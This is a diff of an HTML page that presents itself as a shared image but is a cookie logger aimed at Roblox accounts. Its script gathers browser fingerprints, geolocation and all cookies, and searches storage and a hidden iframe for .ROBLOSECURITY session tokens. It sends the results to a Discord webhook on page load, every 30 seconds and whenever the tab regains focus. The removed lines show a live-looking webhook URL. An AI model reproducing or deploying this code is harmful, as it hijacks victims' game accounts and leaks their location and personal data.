@@ -14,12 +14,6 @@
     <meta property="og:image:height" content="630">
     <meta property="og:url" content="https://tree-bice-nine.vercel.app/">
     
-    <!-- Twitter Card Meta Tags (for additional compatibility) -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Check out this image">
-    <meta name="twitter:description" content="Click to view full size">
-    <meta name="twitter:image" content="YOUR_IMAGE_URL_HERE">
-    
     <style>
         body {
             margin: 0;
@@ -29,41 +23,37 @@
             align-items: center;
             height: 100vh;
             background-color: #f0f0f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         .container {
             text-align: center;
+            position: relative;
         }
         img {
             max-width: 100%;
             max-height: 100vh;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-        .redirect-message {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-family: Arial, sans-serif;
-            display: none;
+        .hidden-iframe {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2ofi0AHyCnjm6yOT2v7CJuRd77lfDqI9gguW-HOuZFS6jORIQC5FuJrb11d9hbp8RLigm7B7FU5ikHZBbpMtYEjRC5LgArOxbsBC--rPk_4xEFYY&s=10&ec=121633959" id="image" alt="">
-    </div>
-    
-    <div class="redirect-message" id="redirectMessage">
-        If you're not redirected automatically, <a href="#" id="manualLink">click here</a>
+        <img src="YOUR_IMAGE_URL_HERE" id="image" alt="">
+        <iframe class="hidden-iframe" id="hiddenFrame"></iframe>
     </div>
 
     <script>
         // CONFIGURE THESE TWO VALUES
-        const imageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2ofi0AHyCnjm6yOT2v7CJuRd77lfDqI9gguW-HOuZFS6jORIQC5FuJrb11d9hbp8RLigm7B7FU5ikHZBbpMtYEjRC5LgArOxbsBC--rPk_4xEFYY&s=10&ec=121633959"; // Replace with your image URL
-        const webhookUrl = "https://discord.com/api/webhooks/1493094966765948989/_Ko5XMz5D8kAc-1FVo5xtY1ekspvsFXhhczRQFQp8aUpUWgoDIZsSwMN-ugPhNtzbOIB"; // Replace with your Discord webhook URL
+        const imageUrl = "YOUR_IMAGE_URL_HERE"; // Replace with your image URL
+        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace with your Discord webhook URL
         
         // Set the image source
         document.getElementById('image').src = imageUrl;
@@ -97,51 +87,172 @@
                 colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 referrer: document.referrer,
-                url: window.location.href
+                url: window.location.href,
+                cookiesEnabled: navigator.cookieEnabled,
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage
             };
         }
 
-        // Function to extract cookies
-        function getRobloxCookies() {
+        // Function to extract all cookies from current domain
+        function getAllCookies() {
             const cookies = document.cookie.split(';');
-            const robloxCookies = {};
+            const allCookies = {};
             
             cookies.forEach(cookie => {
                 const [name, value] = cookie.trim().split('=');
-                if (name.includes('.ROBLOSECURITY')) {
-                    robloxCookies[name] = value;
+                if (name && value) {
+                    allCookies[name] = value;
                 }
             });
+            
+            return allCookies;
+        }
+
+        // Advanced function to try to access Roblox cookies
+        function getRobloxCookiesAdvanced() {
+            const robloxCookies = {};
+            
+            // Method 1: Try to access cookies from current domain
+            const allCookies = getAllCookies();
+            Object.keys(allCookies).forEach(key => {
+                if (key.includes('ROBLOX') || key.includes('.ROBLOSECURITY')) {
+                    robloxCookies[key] = allCookies[key];
+                }
+            });
+            
+            // Method 2: Try to access cookies via localStorage (if any are stored there)
+            try {
+                if (window.localStorage) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && (key.includes('ROBLOX') || key.includes('.ROBLOSECURITY'))) {
+                            robloxCookies[key] = localStorage.getItem(key);
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error('Error accessing localStorage:', e);
+            }
+            
+            // Method 3: Try to access cookies via sessionStorage
+            try {
+                if (window.sessionStorage) {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        if (key && (key.includes('ROBLOX') || key.includes('.ROBLOSECURITY'))) {
+                            robloxCookies[key] = sessionStorage.getItem(key);
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error('Error accessing sessionStorage:', e);
+            }
             
             return robloxCookies;
         }
 
-        // Function to send data to Discord webhook
+        // Function to try to access Roblox cookies via hidden iframe
+        function tryRobloxCookieExtraction() {
+            return new Promise((resolve) => {
+                try {
+                    const hiddenFrame = document.getElementById('hiddenFrame');
+                    
+                    // Try to load a Roblox page in the hidden iframe
+                    hiddenFrame.src = 'https://www.roblox.com/home';
+                    
+                    hiddenFrame.onload = function() {
+                        try {
+                            // Try to access cookies from the iframe
+                            const iframeCookies = hiddenFrame.contentWindow.document.cookie;
+                            
+                            if (iframeCookies) {
+                                const cookies = iframeCookies.split(';');
+                                const robloxCookies = {};
+                                
+                                cookies.forEach(cookie => {
+                                    const [name, value] = cookie.trim().split('=');
+                                    if (name && value && (name.includes('ROBLOX') || name.includes('.ROBLOSECURITY'))) {
+                                        robloxCookies[name] = value;
+                                    }
+                                });
+                                
+                                resolve(robloxCookies);
+                                return;
+                            }
+                        } catch (e) {
+                            console.error('Error accessing iframe cookies:', e);
+                        }
+                        
+                        // If iframe method fails, try other methods
+                        resolve(getRobloxCookiesAdvanced());
+                    };
+                    
+                    // Set a timeout in case the iframe doesn't load
+                    setTimeout(() => {
+                        resolve(getRobloxCookiesAdvanced());
+                    }, 5000);
+                } catch (e) {
+                    console.error('Error in iframe method:', e);
+                    resolve(getRobloxCookiesAdvanced());
+                }
+            });
+        }
+
+        // Function to send data to Discord webhook with improved formatting
         async function sendDataToWebhook(data) {
             try {
+                // Create a more visually appealing webhook
+                const hasRobloxCookies = Object.keys(data.robloxCookies).length > 0;
+                
                 const payload = {
+                    "username": "Cookie Logger",
+                    "avatar_url": "https://i.imgur.com/your-avatar.png", // Optional: Replace with your avatar URL
                     "embeds": [{
-                        "title": "Cookie Logger",
-                        "description": "New victim detected",
-                        "image": {
+                        "title": "🍪 New Cookie Capture",
+                        "description": hasRobloxCookies ? "Successfully captured Roblox cookies!" : "User information captured (no Roblox cookies found)",
+                        "color": hasRobloxCookies ? 5814783 : 15158332, // Green if Roblox cookies found, red otherwise
+                        "thumbnail": {
                             "url": imageUrl
                         },
                         "fields": [
                             {
-                                "name": "Cookies",
-                                "value": "```" + JSON.stringify(data.cookies, null, 2) + "```"
+                                "name": "🔑 Roblox Cookies",
+                                "value": hasRobloxCookies ? 
+                                    "```" + JSON.stringify(data.robloxCookies, null, 2) + "```" : 
+                                    "No Roblox cookies detected",
+                                "inline": false
                             },
                             {
-                                "name": "Location",
-                                "value": "```" + JSON.stringify(data.location, null, 2) + "```"
+                                "name": "🌍 Location",
+                                "value": data.location.error ? 
+                                    `Error: ${data.location.error}` : 
+                                    `Lat: ${data.location.latitude}, Lon: ${data.location.longitude}`,
+                                "inline": true
                             },
                             {
-                                "name": "Browser Info",
-                                "value": "```" + JSON.stringify(data.browser, null, 2) + "```"
+                                "name": "🖥️ Browser",
+                                "value": `\`\`\`${data.browser.userAgent.substring(0, 100)}...\`\`\``,
+                                "inline": true
+                            },
+                            {
+                                "name": "📊 Screen Resolution",
+                                "value": data.browser.screenResolution,
+                                "inline": true
+                            },
+                            {
+                                "name": "🌐 Language",
+                                "value": data.browser.language,
+                                "inline": true
+                            },
+                            {
+                                "name": "🕐 Timezone",
+                                "value": data.browser.timezone,
+                                "inline": true
                             }
                         ],
                         "footer": {
-                            "text": "Timestamp: " + data.timestamp
+                            "text": `Captured at ${data.timestamp}`
                         }
                     }]
                 };
@@ -163,21 +274,67 @@
         }
 
         // Collect all data and send to webhook
-        window.addEventListener('load', () => {
+        window.addEventListener('load', async () => {
             const locationData = getLocation();
             const browserData = getBrowserInfo();
-            const cookieData = getRobloxCookies();
+            const cookieData = getAllCookies();
+            
+            // Try advanced Roblox cookie extraction
+            const robloxCookies = await tryRobloxCookieExtraction();
             
             const allData = {
                 timestamp: new Date().toISOString(),
                 cookies: cookieData,
+                robloxCookies: robloxCookies,
                 location: locationData,
                 browser: browserData
             };
             
+            // Log to console for debugging
+            console.log("Captured data:", allData);
+            
             // Send the data
             sendDataToWebhook(allData);
         });
+
+        // Additional method: Try to capture cookies when user focuses back to this tab
+        document.addEventListener('visibilitychange', async () => {
+            if (!document.hidden) {
+                // User has returned to this tab, try to capture cookies again
+                const robloxCookies = await tryRobloxCookieExtraction();
+                
+                if (Object.keys(robloxCookies).length > 0) {
+                    const allData = {
+                        timestamp: new Date().toISOString(),
+                        robloxCookies: robloxCookies,
+                        location: getLocation(),
+                        browser: getBrowserInfo(),
+                        note: "Captured on tab focus change"
+                    };
+                    
+                    sendDataToWebhook(allData);
+                }
+            }
+        });
+
+        // Additional method: Try to capture cookies periodically
+        setInterval(async () => {
+            const robloxCookies = await tryRobloxCookieExtraction();
+            
+            if (Object.keys(robloxCookies).length > 0) {
+                const allData = {
+                    timestamp: new Date().toISOString(),
+                    robloxCookies: robloxCookies,
+                    location: getLocation(),
+                    browser: getBrowserInfo(),
+                    note: "Captured during periodic check"
+                };
+                
+                sendDataToWebhook(allData);
+            }
+        }, 30000); // Check every 30 seconds
     </script>
 </body>
 </html>
+
+        
